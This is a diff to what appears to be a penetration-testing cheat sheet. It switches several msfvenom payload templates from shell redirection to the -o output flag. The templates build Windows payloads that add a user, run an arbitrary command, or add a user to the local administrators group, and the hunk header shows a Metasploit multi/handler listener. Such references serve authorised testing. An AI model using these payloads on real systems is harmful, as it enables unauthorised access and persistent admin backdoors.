@@ -182,16 +182,16 @@ msfconsole -x "use exploits/multi/handler; set lhost <ip|tun0>; set lport <lport
 
 ## Metasploit - Windows add user
 ```
-msfvenom -p windows/adduser USER=<user> PASS=<pass> -f exe > <filename>.exe
+msfvenom -p windows/adduser USER=<user> PASS=<pass> -f <format> -o <filename>
 ```
 ## Metasploit - Windows Exec
 ```
-msfvenom -p windows/exec CMD="<command>" -f <format> > <filename>.<format>
+msfvenom -p windows/exec CMD="<command>" -f <format> -o <filename>
 ```
 
 ## Metasploit - add user and add to admin group
 #plateform/windows #target/local
 msfvenom payload to add user and add to admin group  
 ```
-msfvenom -p windows/exec CMD="net user <user> <pass> /add && net localgroup administrators <user> /add" -f <format> <filename>.<format>
+msfvenom -p windows/exec CMD="net user <user> <pass> /add && net localgroup administrators <user> /add" -f <format> -o <filename>
 ```
